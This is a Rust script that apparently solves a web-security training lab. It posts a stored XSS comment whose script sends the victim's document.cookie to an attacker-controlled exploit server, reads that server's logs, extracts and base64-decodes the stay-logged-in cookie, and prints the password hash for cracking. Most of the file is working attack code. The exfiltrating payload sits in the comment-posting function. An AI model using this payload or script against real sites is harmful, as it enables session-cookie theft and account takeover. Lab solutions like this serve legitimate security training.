/****************************************************************
*
* Lab: Offline password cracking
*
* Hack Steps: 
*      1. Post a comment with a malicious XSS payload
*      2. Fetch the exploit sever logs
*      3. Extract the encoded cookie from logs
*      4. Decode the encoded cookie
*      5. Crack this hash using any online hash cracker
*
*****************************************************************/
#![feature(ascii_char)]
use base64::{self, engine::general_purpose::STANDARD_NO_PAD, Engine};
use lazy_static::lazy_static;
use regex::{self, Regex};

use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0a3a004303cf66698195fd1c00760019.web-security-academy.net"; // Change this to your lab URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a3000810395668f81ddfc08018b001f.exploit-server.net"; // Change this to your exploit server URL

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Posting a comment with a malicious XSS payload.. ");

    posting_comment_with_malicious_xss_payload();

    println!("{}", "OK".green());
    print!("⦗2⦘ Fetching the exploit sever logs.. ");

    let log_page = fetch_from_server("/log");

    println!("{}", "OK".green());
    print!("⦗3⦘ Extracting the encoded cookie from logs.. ");

    let cookie_encoded = get_cookie_from_logs(log_page);

    println!("{}", "OK".green());
    print!("⦗4⦘ Decoding the encoded cookie.. ");

    let cookie_decoded = decode_cookie(cookie_encoded);
    let hash = cookie_decoded.split(":").nth(1).unwrap();

    println!("{}", "OK".green());
    println!("🗹 Password hash: {}", hash.green());
    println!("⦗*⦘ Crack this hash using any online hash cracker");
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn posting_comment_with_malicious_xss_payload() {
    WEB_CLIENT.post(&format!("{LAB_URL}/post/comment"))
    .form(&HashMap::from(
       [("postId", "1"),
        ("comment",
        &format!("<script>fetch('{EXPLOIT_SERVER_URL}/exploit?cookie=' + document.cookie)</script/> Exploited!")
         ),
        ("name", "Hacker"),
        ("email", "hacker@hacker.me"),
       ]
    )).
    send().expect(&format!("{}", "⦗!⦘ Failed to post a comment with the malicious XSS payload"));
}

fn fetch_from_server(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{EXPLOIT_SERVER_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_cookie_from_logs(log_page: Response) -> String {
    let logs = log_page.text().unwrap();
    let cookie_encoded = capture_pattern_from_text("stay-logged-in=(.*) HTTP", &logs);
    return cookie_encoded;
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn decode_cookie(cookie: String) -> String {
    STANDARD_NO_PAD
        .decode(cookie)
        .unwrap()
        .as_ascii()
        .unwrap()
        .as_str()
        .to_string()
}
